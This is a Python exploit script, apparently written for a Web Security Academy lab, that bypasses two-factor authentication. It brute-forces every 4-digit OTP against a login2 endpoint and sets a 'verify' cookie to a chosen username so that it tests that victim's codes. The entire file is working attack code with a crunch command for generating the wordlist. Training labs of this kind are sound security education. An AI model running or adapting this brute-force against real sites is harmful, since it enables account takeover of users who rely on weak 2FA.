#!/usr/bin/env python3

#Author: Mohd Badrudduja
#Title: 2FA broken logic
#Module: Authentication Lab07 (Web Security Academy)
#Execution: Generate the otp file with crunch and put it in the script & change the header values accordingly.
#Command: crunch 4 4 0123456789
#python3 lab07-exploit.py "<url/login2>"

import requests
import sys
import urllib3

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.session()

def brute_otp(url):
    file = "<absolute-path-of-otp-file>"
    with open(file, 'r') as outfile:
        otps = outfile.read().split('\n')
    for otp in otps:
        data = {'mfa-code': otp}
        headers = {"Host": "Hostname.web-security-academy.net",
                  "Cookie": "session=<SESSID>; verify=<UserName>",
                  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                  "Accept-Language": "en-US,en;q=0.5",
                  "Accept-Encoding": "gzip, deflate",
                  "Content-Type": "application/x-www-form-urlencoded",
                  "Content-Length": "13",
                  "Origin": "https://Hostname.web-security-academy.net",
                  "Referer": "https://Hostname.web-security-academy.net/login2",
                  "Upgrade-Insecure-Requests": "1",
                  "Te": "trailers",
                  "Connection": "close"}
        r = session.post(url=url, headers=headers, data=data, proxies=proxies, verify=False, allow_redirects=True)
        req = r.text
        if "<UserName>" in req:
            print("[+] Valid OTP for user <UserName> is: " + otp)
            break

def main():
    if len(sys.argv) != 2:
        print('[+] Example: %s www.test.com' %sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Bruteforcing for OTP...")
    brute_otp(url)

if __name__ == '__main__':
    main()
